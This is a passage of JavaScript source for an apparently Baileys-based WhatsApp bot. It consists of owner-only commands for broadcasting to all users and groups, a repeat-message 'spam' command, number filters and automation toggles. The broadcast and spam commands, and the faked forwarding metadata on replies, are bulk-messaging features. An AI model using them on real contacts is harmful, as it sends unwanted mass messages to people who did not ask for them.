  messageId: msg.key.id
})
}
}
break
			case 'bc':
            case 'broadcast': {
               if (!XeonTheCreator) return XeonStickOwner()
               if (!text) return replygcxeon('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await XeonBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await XeonBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await XeonBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcxeon(`Success ${command} To ${Object.keys(global.db.users).length} Users`)
            }
            break
            case 'bcgc':
            case 'bcgroup': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcxeon(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    XeonBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcxeon(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
			case 'spam':
				if (!XeonTheCreator) return XeonStickOwner()
					if (!text) return replygcxeon(`Use ${prefix +command} text|amount`)
				xeonarg = text.split("|")
				if (!xeonarg) return replygcxeon(`Use ${prefix+ command} text|amount`)
				if (Number(xeonarg[1]) >= 50) return replygcxeon('Max 50!')
				if (isNaN(xeonarg[1])) return replygcxeon(`must be a number`)
				for (let i = 0; i < xeonarg[1]; i++){
					XeonBotInc.sendMessage(m.chat, {text: xeonarg[0]})
				}
				break
			case 'antiforeign':{
            	if (!m.isGroup) return XeonStickGroup()
if (!m.isBotAdmin) return XeonStickBotAdmin()
if (!m.isAdmin && !XeonTheCreator) return XeonStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antiforeignnum = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiforeignnum = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!XeonTheCreator) return XeonStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcxeon(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            try {
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await XeonBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
            } catch {
            	replygcxeon(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
                }
        }
        break
			case 'autoblock':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].autoblocknum = true
                    replygcxeon(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autoblocknum = false
                    replygcxeon(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replygcxeon(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlygrub = false
                    replygcxeon(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replygcxeon(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replygcxeon(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindia = true
                    replygcxeon(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindia = false
                    replygcxeon(`Successfully Changed Only-Indian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindo = true
                    replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindo = false
                    replygcxeon(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'setautoblock':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} 92`)
                global.autoblocknumber = text
                replygcxeon(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} 91`)
                global.antiforeignnumber = text
                replygcxeon(`Anti-foreign number successfully changed to ${text}`)
                break
			case 'autoswview':
    case 'autostatusview':{
             if (!XeonTheCreator) return XeonStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].antiswview = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].antiswview = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!XeonTheCreator) return XeonStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].anticall = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].anticall = false
                  replygcxeon(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'autorecordtype':
                if (!XeonTheCreator) return XeonStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecordtype = true
                    replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecordtype = false
                    replygcxeon(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!XeonTheCreator) return XeonStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecord = true
                    replygcxeon(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecord = false
                    replygcxeon(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'autotype':
                if (!XeonTheCreator) return XeonStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autotype = true
                    replygcxeon(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autotype = false
                    replygcxeon(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'autoread':
                if (!XeonTheCreator) return XeonStickOwner()
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!XeonTheCreator) return XeonStickOwner()
                
                if (q == 'on') {
                    db.settings[botNumber].autobio = true
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autobio = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'self': case 'public': case 'mode': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (q == 'on') {
                XeonBotInc.public = true
                replygcxeon('*Successful in Changing To Public Usage*')
                } else if (q == 'off') {
                XeonBotInc.public = false
                replygcxeon('*Successful in Changing To Self Usage*')
                } else {
                	let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT 🌹',
							sections: [{
								title: 'BOT MODE',
								rows: [
									{ title: 'Public', description: 'Bot Usage', id: `${prefix+command} on` },
									{ title: 'Self', description: 'Bot Usage', id: `${prefix+command} off` },
								]
							}]
						}
					}]
                	await XeonBotInc.sendButtonMsg(m.chat, 'BOT MODE', xeonytimewisher, 'Please choose 🌹', null, button, m);
